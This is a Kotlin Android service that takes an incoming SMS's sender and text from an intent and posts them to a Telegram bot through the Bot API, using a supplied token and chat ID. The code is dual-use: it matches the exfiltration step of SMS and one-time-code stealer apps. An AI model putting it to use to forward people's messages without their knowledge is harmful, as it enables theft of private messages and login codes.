package com.proyek.nuklir

import android.app.Service
import android.content.Intent
import android.os.IBinder
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException

class TelegramService : Service() {

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent != null) {
            val sender = intent.getStringExtra("sender") ?: "Unknown"
            val message = intent.getStringExtra("message") ?: ""
            val token = intent.getStringExtra("token") ?: ""
            val chatId = intent.getStringExtra("chatId") ?: ""

            if (token.isNotEmpty() && chatId.isNotEmpty()) {
                sendToTelegram(token, chatId, "📩 *SMS Masuk*\nDari: `$sender`\nPesan: $message")
            }
        }
        return START_NOT_STICKY
    }

    private fun sendToTelegram(token: String, chatId: String, text: String) {
        val client = OkHttpClient()
        val url = "https://api.telegram.org/bot$token/sendMessage"
        val json = "{\"chat_id\":\"$chatId\",\"text\":\"${escapeJson(text)}\",\"parse_mode\":\"Markdown\"}"
        val body = json.toRequestBody("application/json; charset=utf-8".toMediaType())

        val request = Request.Builder()
            .url(url)
            .post(body)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                // handle failure if needed
            }
            override fun onResponse(call: Call, response: Response) {
                response.close()
            }
        })
    }

    private fun escapeJson(str: String): String {
        return str.replace("\n", "\\n")
            .replace("\"", "\\\"")
            .replace("\r", "")
    }
}
